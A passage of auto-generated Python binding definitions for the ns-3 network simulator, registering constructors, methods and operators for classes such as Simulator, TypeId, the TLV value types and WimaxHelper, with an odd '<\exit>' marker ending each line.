'ns3::Time',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('GetImplementation',<\exit>
'ns3::Ptr< ns3::SimulatorImpl >',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetMaximumSimulationTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSystemId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsExpired',<\exit>
'bool',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('IsFinished',<\exit>
'bool',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_static=True, deprecated=True)<\exit>
cls.add_method('Now',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Remove',<\exit>
'void',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('RunOneEvent',<\exit>
'void',<\exit>
[],<\exit>
is_static=True, deprecated=True)<\exit>
cls.add_method('SetImplementation',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SimulatorImpl >', 'impl')],<\exit>
is_static=True)<\exit>
cls.add_method('SetScheduler',<\exit>
'void',<\exit>
[param('ns3::ObjectFactory', 'schedulerFactory')],<\exit>
is_static=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[param('ns3::Time const &', 'time')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3Tag_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Tag const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'i')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'i')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TagBuffer_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TagBuffer const &', 'arg0')])<\exit>
cls.add_constructor([param('uint8_t *', 'start'), param('uint8_t *', 'end')])<\exit>
cls.add_method('CopyFrom',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'o')])<\exit>
cls.add_method('Read',<\exit>
'void',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('ReadDouble',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('ReadU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadU8',<\exit>
'uint8_t',<\exit>
[])<\exit>
cls.add_method('TrimAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'trim')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('WriteDouble',<\exit>
'void',<\exit>
[param('double', 'v')])<\exit>
cls.add_method('WriteU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteU64',<\exit>
'void',<\exit>
[param('uint64_t', 'v')])<\exit>
cls.add_method('WriteU8',<\exit>
'void',<\exit>
[param('uint8_t', 'v')])<\exit>
return<\exit>
def register_Ns3TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TlvValue const &', 'arg0')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::TlvValue *',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TosTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TosTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'arg0'), param('uint8_t', 'arg1'), param('uint8_t', 'arg2')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::TosTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetHigh',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLow',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMask',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TriangularVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TriangularVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 's'), param('double', 'l'), param('double', 'mean')])<\exit>
return<\exit>
def register_Ns3TypeId_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('char const *', 'name')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeId const &', 'o')])<\exit>
cls.add_method('AddAttribute',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])<\exit>
cls.add_method('AddAttribute',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name'), param('std::string', 'help'), param('uint32_t', 'flags'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])<\exit>
cls.add_method('AddTraceSource',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::Ptr< ns3::TraceSourceAccessor const >', 'accessor')])<\exit>
cls.add_method('GetAttribute',<\exit>
'ns3::TypeId::AttributeInformation',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetAttributeFullName',<\exit>
'std::string',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetAttributeN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConstructor',<\exit>
'ns3::Callback< ns3::ObjectBase *, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGroupName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetParent',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRegistered',<\exit>
'ns3::TypeId',<\exit>
[param('uint32_t', 'i')],<\exit>
is_static=True)<\exit>
cls.add_method('GetRegisteredN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetTraceSource',<\exit>
'ns3::TypeId::TraceSourceInformation',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTraceSourceN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasConstructor',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasParent',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HideFromDocumentation',<\exit>
'ns3::TypeId',<\exit>
[])<\exit>
cls.add_method('IsChildOf',<\exit>
'bool',<\exit>
[param('ns3::TypeId', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('LookupAttributeByName',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::TypeId::AttributeInformation *', 'info')],<\exit>
is_const=True)<\exit>
cls.add_method('LookupByName',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name')],<\exit>
is_static=True)<\exit>
cls.add_method('LookupTraceSourceByName',<\exit>
'ns3::Ptr< ns3::TraceSourceAccessor const >',<\exit>
[param('std::string', 'name')],<\exit>
is_const=True)<\exit>
cls.add_method('MustHideFromDocumentation',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetAttributeInitialValue',<\exit>
'bool',<\exit>
[param('uint32_t', 'i'), param('ns3::Ptr< ns3::AttributeValue const >', 'initialValue')])<\exit>
cls.add_method('SetGroupName',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'groupName')])<\exit>
cls.add_method('SetParent',<\exit>
'ns3::TypeId',<\exit>
[param('ns3::TypeId', 'tid')])<\exit>
cls.add_method('SetUid',<\exit>
'void',<\exit>
[param('uint16_t', 'tid')])<\exit>
return<\exit>
def register_Ns3TypeIdAttributeInformation_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeId::AttributeInformation const &', 'arg0')])<\exit>
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::AttributeAccessor const >', is_const=False)<\exit>
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)<\exit>
cls.add_instance_attribute('flags', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('help', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('initialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)<\exit>
cls.add_instance_attribute('name', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('originalInitialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)<\exit>
return<\exit>
def register_Ns3TypeIdTraceSourceInformation_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeId::TraceSourceInformation const &', 'arg0')])<\exit>
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::TraceSourceAccessor const >', is_const=False)<\exit>
cls.add_instance_attribute('help', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('name', 'std::string', is_const=False)<\exit>
return<\exit>
def register_Ns3U16TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::U16TlvValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint16_t', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::U16TlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValue',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3U32TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::U32TlvValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint32_t', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::U32TlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValue',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3U8TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::U8TlvValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint8_t', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::U8TlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValue',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3UcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBwReqOppSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrequency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangReqOppSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetBwReqOppSize',<\exit>
'void',<\exit>
[param('uint16_t', 'bwReqOppSize')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint32_t', 'frequency')])<\exit>
cls.add_method('SetRangReqOppSize',<\exit>
'void',<\exit>
[param('uint16_t', 'rangReqOppSize')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3UniformVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UniformVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 's'), param('double', 'l')])<\exit>
cls.add_method('GetInteger',<\exit>
'uint32_t',<\exit>
[param('uint32_t', 's'), param('uint32_t', 'l')])<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[param('double', 's'), param('double', 'l')])<\exit>
return<\exit>
def register_Ns3VectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::VectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Tlv const &', 'val')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::VectorTlvValue *',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3WeibullVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WeibullVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3WimaxHelper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxHelper const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateBSScheduler',<\exit>
'ns3::Ptr< ns3::BSScheduler >',<\exit>
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('CreatePhy',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType')])<\exit>
cls.add_method('CreatePhy',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])<\exit>
cls.add_method('CreatePhyWithoutChannel',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType')])<\exit>
cls.add_method('CreatePhyWithoutChannel',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])<\exit>
cls.add_method('CreateServiceFlow',<\exit>
'ns3::ServiceFlow',<\exit>
[param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::ServiceFlow::SchedulingType', 'schedulinType'), param('ns3::IpcsClassifierRecord', 'classifier')])<\exit>
cls.add_method('CreateUplinkScheduler',<\exit>
'ns3::Ptr< ns3::UplinkScheduler >',<\exit>
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('EnableAsciiForConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'oss'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('char *', 'netdevice'), param('char *', 'connection')],<\exit>
is_static=True)<\exit>
cls.add_method('EnableLogComponents',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Install',<\exit>
'ns3::NetDeviceContainer',<\exit>
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'type'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('Install',<\exit>
'ns3::NetDeviceContainer',<\exit>
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('Install',<\exit>
'ns3::NetDeviceContainer',<\exit>
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType'), param('double', 'frameDuration')])<\exit>
cls.add_method('Install',<\exit>
'ns3::Ptr< ns3::WimaxNetDevice >',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('SetPropagationLossModel',<\exit>
'void',<\exit>
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propagationModel')])<\exit>
cls.add_method('EnableAsciiInternal',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('EnablePcapInternal',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename'), param('bool', 'promiscuous')],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ZetaVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ZetaVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'alpha')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3ZipfVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ZipfVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('long int', 'N'), param('double', 'alpha')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3Empty_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::empty const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Int64x64_t_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_inplace_numeric_operator('+=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_unary_numeric_operator('-')<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
